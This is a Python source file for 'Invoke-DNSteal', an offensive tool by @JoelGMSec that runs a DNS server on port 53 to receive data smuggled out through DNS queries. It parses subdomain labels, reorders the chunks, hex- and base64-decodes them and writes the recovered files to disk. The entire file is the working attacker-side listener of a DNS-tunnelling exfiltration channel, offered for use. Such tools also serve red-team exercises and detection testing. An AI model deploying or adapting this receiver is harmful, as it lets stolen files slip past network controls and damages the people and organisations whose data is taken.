#!/usr/bin/python
#================================#
#  Invoke-DNSteal by @JoelGMSec  #
#      https://darkbyte.net      #
#================================#

# Imports
import os, re, sys, time, socket

# Banner
print("""\033[1;34m
  ___                 _              ____  _   _ ____  _             _ 
 |_ _|_ __ _   __ __ | | __ __      |  _ \| \ | / ___|| |__ __  __ _| |
  | || '_ \ \ / / _ \| |/ / _ \_____| | | |  \| \___ \| __/ _ \/ _' | |
  | || | | \ V / (_) |   <  __/_____| |_| | |\  |___) | ||  __/ (_| | |
 |___|_| |_|\_/ \___/|_|\_\___|     |____/|_| \_|____/ \__\___|\__,_|_|""")

print("""\033[1;32m
  --------------------------- by @JoelGMSec -------------------------- """)

# Help
def help(str=""):
 print("\n\033[1;33mUsage: \033[0mpython %s [listen_address] -udp/-tcp" % sys.argv[0])
 print(str)

# DNS Query
class DnsQuery:
 def __init__(self, data):
  self.data = data
  self.datatxt = ''

  type = (ord(data[2]) >> 3) & 15
  if type == 0:
   if "-udp" in mode:
    ini=12
   if "-tcp" in mode:
    ini=14
   len=ord(data[ini])
  while len != 0:
   self.datatxt += data[ini+1:ini+len+1]+'.'
   ini += len+1
   len=ord(data[ini])

 def request(self, ip):
  if self.datatxt:
   packet=''

   if "-udp" in mode:
    packet+=self.data[:2] + "\x81\x80"
    packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
    packet+=self.data[12:]
    packet+='\xc0\x0c'
    packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'

   if "-tcp" in mode:
    hexdata= ord(self.data[1]) + 0x10
    packet+=self.data[0] + chr(hexdata)
    packet+="\x00\x01\x85\x80\x00\x01\x00\x01"
    packet+=self.data[10:]
    packet+='\xc0\x0c'
    packet+='\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04'

   packet+=str.join('',[chr(int(x)) for x in ip.split('.')])
  return packet

# Get File Extension
def getext(rawdata):
  for key,value in rawdata.items():
   startend = (key.split('.')[1:3])

   for i in range(len(startend)):
    if startend[i] == "start":
     ext = startend[0]
     if ext == "start":
      ext = "txt"
  return ext

# Sort Data
def sortedata(rawdata):
 data = rawdata.keys()
 array_int = [] ; array_str = [] ; array_sub = []

 for i in data:
  integer = i.split('.')[0]
  array_int.append(int(integer))
 sorted_array = sorted(array_int)
 
 for i in sorted_array:
  array_str.append(str(i))

 for i in range(len(array_str)):
  for sub in data:
   dot = array_str[i] + '.'

   if dot == sub[0:len(array_str[i])+1]:
    array_sub.append(sub)
 return array_sub

# Clean Data
def deletedots(cleandata):
 cleandata = cleandata.replace(cleandata[:len(cleandata.split('.')[0])+1], '',1)
 cleandata = cleandata.replace('.', '')
 cleandata = cleandata.replace('start', '')
 cleandata = cleandata.replace('end', '')
 return cleandata

# Save Data
def savedata(rawdata):
 ext = getext(rawdata)
 sorted_data = sortedata(rawdata)
 date = time.strftime("%H.%M-%d.%m")
 file = "dnsteal_%s.%s" % (date, ext)

 for key in sorted_data:
  cleandata = '.'.join(key.split('.')[0:-3])
  cleandata = deletedots(cleandata)
  cleandata = cleandata.replace(ext, '')

  try:
   f = open(file, "a")
   f.write(cleandata)
   f.close()

  except:
   print("\033[1;31m[!] Error saving data to %s!" % (file))

 return file

# Decode Data
def decodedata(rawdata):
 ext = getext(rawdata)
 file = savedata(rawdata)

 try:
  f = open(file, "r")
  outdata = []
  cleandata = f.read().strip()
  f.close()

  cleandata = cleandata.decode("hex")
  cleandata = cleandata.strip().decode("base64")
  outdata.append(cleandata)

  f = open(file, 'w')
  f.writelines(outdata)
  f.close()

 except:
  print("\033[1;31m[!] Error saving data to %s!" % (file))

# Main Function
def args(a,b,ip,mode): ""

if __name__ == '__main__':
 a  = 4 ; b  = 57 ; flen = 17
 regx_ip = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$";

 if "-h" in sys.argv or len(sys.argv) < 2:
  help()
  exit(1)  
 
 ip = sys.argv[1] ; mode = sys.argv[2]
 if re.match(regx_ip, ip) == None:
  help()
  exit(1)

 udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

 try:
  if "-udp" in mode:
   udp.bind((ip,53))

  if "-tcp" in mode:
   tcp.bind((ip,53))
   tcp.listen(1)

 except:
  print("\n\033[1;31m[!] Cannot bind to address %s:53!\n" % (ip))
  exit(1)

# Append & Print Data
 if "-tcp" in mode:
  proto = "TCP"
 if "-udp" in mode:
  proto = "UDP"
 
 print("\n\033[1;34m[i] DNS listening on %s:53 over %s" % (ip, proto))
 print("\n\033[1;34m[i] Press Ctrl+C anytime to exit, data is saved automatically\n\033[0m")
 args(a,b,ip,mode)
  
 try:
  rawdata = {}
  while True:

   if "-tcp" in mode:
    conn, addr = tcp.accept()
    data = conn.recv(1024)
    payload=DnsQuery(data)
    conn.sendto(payload.request(ip), addr)

   if "-udp" in mode:
    data, addr = udp.recvfrom(1024)
    payload=DnsQuery(data)
    udp.sendto(payload.request(ip), addr)

   splitrequest = payload.datatxt.split(".")
   splitrequest.pop()

   dlen = len(splitrequest)
   request = "" 
   datatmp = []

   for n in range(0,dlen):
    if splitrequest[n][len(splitrequest[n])-1] == "-":
     datatmp.append(splitrequest[n])

    else:
     request += splitrequest[n] + "."

   request = request[:-1]
   if request not in rawdata:
    rawdata[request] = []

   print("\033[1;32m[+] Data: %d bytes \033[0m- %s" % (len(payload.datatxt), request))

   for d in datatmp:
    rawdata[request].append(d)
   
   if "end" in str(rawdata):
    date = time.strftime("%H.%M-%d.%m") ; ext = getext(rawdata)
    print("\033[1;33m[>] DNS Data Saved to dnsteal_%s.%s\033[0m" % (date, ext))
    decodedata(rawdata) ; rawdata = {}

# Exit & Close Sockets
 except KeyboardInterrupt:
  print('\n\033[1;31m[!] Ctrl+C pressed! Exiting..\033[0m\n')
  udp.close() ; tcp.close()
  